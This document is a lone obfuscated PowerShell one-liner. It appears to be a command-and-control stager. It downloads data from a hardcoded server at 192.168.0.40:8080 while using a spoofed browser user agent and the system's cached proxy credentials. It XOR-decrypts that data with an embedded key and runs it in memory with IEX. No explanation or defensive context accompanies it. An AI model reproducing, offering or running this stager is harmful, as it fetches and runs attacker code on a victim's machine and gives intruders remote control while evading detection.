
[SYSTEM.NeT.SERVicEPoINtMaNageR]::EXpECt100CoNTiNue = 0;$wC=NEW-OBJECT SySTEM.Net.WEBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDeRs.ADd('User-Agent',$u);$wc.PRoxY = [SYsTem.NET.WEbReQuESt]::DEFaultWEbPrOxy;$wC.PRoxy.CreDenTiAls = [SySTEm.NEt.CrEDEntiaLCacHE]::DEfAuLtNETWORkCreDEnTials;$K='L_:\H;i%(Gq5xB1N[*fYVwpmbS>dE)J<';$i=0;[chAr[]]$B=([CHar[]]($wc.DownLOAdSTrInG("http://192.168.0.40:8080/index.asp")))|%{$_-bXOr$k[$i++%$k.LeNgth]};IEX ($B-JOIn'')

